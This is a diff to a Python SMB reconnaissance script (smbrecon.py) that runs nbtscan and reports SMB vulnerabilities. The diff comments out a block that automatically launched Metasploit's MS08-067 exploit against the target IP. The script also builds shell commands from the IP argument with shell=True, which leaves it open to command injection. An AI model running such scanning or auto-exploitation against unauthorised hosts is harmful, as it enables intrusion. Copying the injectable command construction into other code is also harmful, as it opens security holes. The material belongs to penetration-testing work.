@@ -3,13 +3,12 @@ import sys
 import subprocess
 
 def main(args):
-	if len(args) != 4:
+	if len(args) != 3:
 		print("Usage: smbrecon.py <ip address> <port> <msfcli>")
 		return
 
 	ip = args[1]
 	port = args[2]
-	msf = args[3]
 	print("INFO: Starting nbtscan on " + ip)
 	NBTSCAN = "nbtscan -r %s" % (ip)
 	nbtresults = subprocess.check_output(NBTSCAN, shell=True)
@@ -37,11 +36,11 @@ def main(args):
 	for line in lines:
 		if "VULNERABLE" in line and "NOT VULNERABLE" not in line:
 			print("FOUND: SMB VULN on " +ip+ ": " +line + " | check discovery/smb for full results")
-		if msf:
-			if "MS08-067:" in line and "VULNERABLE" in line and "NOT" not in line:
-				print("Exploiting MS08-067")
-				cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
-				subprocess.call(cmd.split(" "))
+	#	if msf:
+	#		if "MS08-067:" in line and "VULNERABLE" in line and "NOT" not in line:
+	#			print("Exploiting MS08-067")
+	#			cmd = "gnome-terminal -x msfcli exploit/windows/smb/ms08_067_netapi RHOST=" + ip + " E"
+	#			subprocess.call(cmd.split(" "))
 	resultsfile = "discovery/smb/" + ip + "_nse.txt"
 	f = open(resultsfile, "w")
 	f.write(nbtresults)
